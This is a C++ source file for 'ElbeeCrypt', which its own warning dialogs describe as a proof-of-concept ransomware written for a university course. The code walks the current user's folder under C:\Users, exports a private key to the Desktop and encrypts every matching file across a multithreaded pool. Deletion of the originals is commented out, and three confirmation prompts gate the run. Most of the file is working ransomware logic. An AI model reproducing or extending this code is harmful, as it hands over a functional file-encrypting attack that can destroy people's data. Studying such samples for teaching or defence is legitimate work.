//C++ std dependencies
#include <filesystem>
#include <fstream>
#include <iostream>
#include <map>
#include <string>
#include <vector>

//3rd-party dependencies
#include <fmt/core.h>
#include "thread-pool/BS_thread_pool.hpp"

//Common dependencies
#include "elbeecrypt/common/settings.hpp"
#include "elbeecrypt/common/io/cryptor-engine.hpp"
#include "elbeecrypt/common/utils/fs.hpp"
#include "elbeecrypt/common/utils/string.hpp"
#include "elbeecrypt/common/utils/threadsafe_cout.hpp"

//Cryptor dependencies
#include "elbeecrypt/cryptor/hunter-encryptor.hpp"
#include "elbeecrypt/cryptor/main.hpp"


//Platform-specific includes
#if defined(_WIN32) || defined(__WIN32__) || defined(WIN32)
	//Definitions
	#define WINDOWS_PLATFORM
	#define WIN32_LEAN_AND_MEAN
	#include <windows.h>
#else
	#error "This code is only meant to be compiled for Windows targets. Either cross-compile or build natively on Win-32."
#endif

//Namespace definitions
namespace fs = std::filesystem;
using namespace elbeecrypt;

void writeTo(fs::path path, std::string content){
	std::ofstream file;
	file.open(path, std::ios_base::app);
	file << content << "\n";
	file.close();
}

/** 
 * Main entrypoint for ElbeeCrypt's cryptor binary. 
 * 
 * @param argc The number of arguments
 * @param argv The arguments themselves
 * @return The status code on conclusion of execution
 */
int main(int argc, char **argv){
	//Deploy the safety net before continuing
	if(common::Settings::SAFETY_NET == true){
		if(!cryptor::Main::safetyNet()) exit(-1);
	}

	//Encrypt files
	std::cout << "Encryption routines started!" << std::endl;
	cryptor::Main::encrypt();


	//Set the base path
	



	/*
	for(fs::path path : paths){
		writeTo(common::io::DirentWalk::pwd() / "test-paths.txt", path.string());
	}
	*/
}

/** Impl of safetyNet(). */
bool cryptor::Main::safetyNet(){
	//First prompt with info about the program
	int promptOne = MessageBox(
		NULL,
		"Welcome to ElbeeCrypt: A PoC file-encrypting ransomware for CECS-378. \n\nMade by Josh, Jaxon, Valeria, Nathanael, David, Alvin, and Robin \n\nWARNING: This is a live file encrypting ransomware. While this sample doesn't destroy encryption keys like other ransomware, things can go haywire if the keys are lost or damaged or you delete the encrypted files. We are not responsible for any damage to your files or system. DO NOT PROCEED UNLESS YOU ARE OKAY WITH PERMANENT DAMAGE TO YOUR FILES. \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONASTERISK | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptOne == IDCANCEL) return false; //Gate one

	//Second prompt with further warning
	int promptTwo = MessageBox(
		NULL,
		"This ransomware sample, like other ransomware, CAN DESTROY YOUR PERSONAL FILES PERMANENTLY. Unless configured otherwise, this sample will recursively hunt out EVERY TARGET file in \"C:\\Users\\\", meaning any file in that directory that matches the target extension list WILL BE ENCRYPTED! \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONWARNING | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptTwo == IDCANCEL) return false; //Gate two

	//Third prompt with a final warning
	int promptThree = MessageBox(
		NULL,
		"LAST WARNING: THIS SAMPLE CAN DESTROY YOUR FILES!!!!!! As stated previously THE AUTHORS HOLD NO RESPONSIBILITY IF THIS OCCURS. \n\nIf you are okay to proceed, press the \"OK\" button.",
		"ElbeeCrypt",
		MB_ICONERROR | MB_OKCANCEL | MB_DEFBUTTON2
	);
	if(promptThree == IDCANCEL) return false; //Gate three

	//No cancellations, so return true be default
	return true;
}

/** Impl of encrypt(). */
void cryptor::Main::encrypt(){
	//Set the root directories
	const fs::path basePath("C:\\Users\\" + std::string(getenv("username")));
	std::cout << "Path: " << basePath << std::endl;

	//Initialize the encryption engine
	common::io::CryptorEngine cryptorEngine(common::Settings::CRYPTO_CHUNK_SIZE);

	//Drop the encryption key to the desktop
	std::string keyName = fmt::format(common::Settings::ENCRYPTION_KEY_NAME, fmt::arg("pubkeyFingerprint", cryptorEngine.pubkeyFingerprint()));
	fs::path encryptionKeyPath = basePath / "Desktop" / keyName;
	cryptorEngine.exportPrivkey(encryptionKeyPath);

	//Get the list of targets to encrypt
	cryptor::HunterEncryptor hunter({basePath});

	//Shard the targets vector x ways
	std::map<uint32_t, std::vector<fs::path>> shards = common::utils::Container::shardVector(hunter.getTargets(), common::Settings::ENCRYPTION_THREADS);

	//Create vectors to store the lists of  and unsuccessfully encrypted files
	std::vector<fs::path> successfullyEncrypted = {};
	std::vector<fs::path> failedEncrypted = {};

	//Create a thread pool for file encryption
	BS::thread_pool pool(common::Settings::ENCRYPTION_THREADS);

	//Create the encryptor lambda
	auto encryptor = [&cryptorEngine, &successfullyEncrypted, &failedEncrypted](const std::vector<fs::path>& targets){
		//Loop over the targets
		for(fs::path target : targets){
			//Create the path in which the target encrypted file will be dropped
			fs::path encryptedOut = common::utils::FS::appendExt(target, common::Settings::ENCRYPTED_EXTENSION);

			//Encrypt the file with the cryptor engine
			common::io::CryptorEngine::Status encryptionResult = cryptorEngine.encryptFile(target, encryptedOut);

			//Delete the file at the given path
			//fs::remove(target);

			//Add the path to the appropriate vector depending on the result
			encryptionResult == common::io::CryptorEngine::Status::OK ? 
				successfullyEncrypted.push_back(target) :
				failedEncrypted.push_back(target);
		}
	};

	//std::cout << shards.at(0).at(0) << std::endl;

	//Create x threads to encrypt the files
	for(size_t i = 0; i < shards.size(); i++){
		//Spawn a thread to encrypt the current shard of file paths
		pool.push_task(encryptor, shards.at(i));
		common::utils::Cout{} << "Pushed shard #" << (i + 1) << " for processing. Shard contains " << shards.at(i).size() << " items..." << std::endl;
	}

	//Wait on the treads to complete before going on
	pool.wait_for_tasks();
	common::utils::Cout{} << "Encrypted " << successfullyEncrypted.size() << " files" << std::endl;
	common::utils::Cout{} << "Failed to encrypt " << failedEncrypted.size() << " files" << std::endl;
}